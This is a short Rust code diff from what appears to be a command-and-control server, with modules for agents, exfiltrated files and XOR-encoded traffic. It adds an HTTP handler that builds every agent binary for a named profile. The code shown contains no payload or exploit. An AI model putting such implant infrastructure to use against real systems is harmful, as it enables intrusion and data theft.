@@ -1,7 +1,7 @@
 use std::sync::Arc;
 
 use crate::{
-    admin_task_dispatch::admin_dispatch,
+    admin_task_dispatch::{admin_dispatch, build_all_bins},
     agents::handle_kill_command,
     app_state::AppState,
     exfil::handle_exfiltrated_file,
@@ -9,13 +9,14 @@ use crate::{
 };
 use axum::{
     Json,
-    extract::{Path, Request, State},
+    extract::{Path, Query, Request, State},
     http::{HeaderMap, StatusCode},
     response::{IntoResponse, Response},
 };
+use serde::Deserialize;
 use shared::{
     net::{XorEncode, decode_http_response},
-    tasks::{AdminCommand, Command, FirstRunData},
+    tasks::{AdminCommand, BuildAllBins, Command, FirstRunData},
 };
 
 /// Handles the inbound connection, after authentication has validated the agent.
@@ -218,4 +219,19 @@ pub async fn poll_agent_notifications(
         }
         Err(_) => (StatusCode::INTERNAL_SERVER_ERROR, "".to_string()),
     }
+}
+
+#[derive(Deserialize)]
+pub struct BaBData {
+    profile_name: String,
+}
+
+pub async fn build_all_binaries_handler(
+    state: State<Arc<AppState>>,
+    data: Query<BaBData>,
+) -> Response {
+    let bab = (data.profile_name.clone(), "".to_string(), None, None);
+    let result = build_all_bins(bab, state).await;
+
+    StatusCode::OK.into_response()
 }
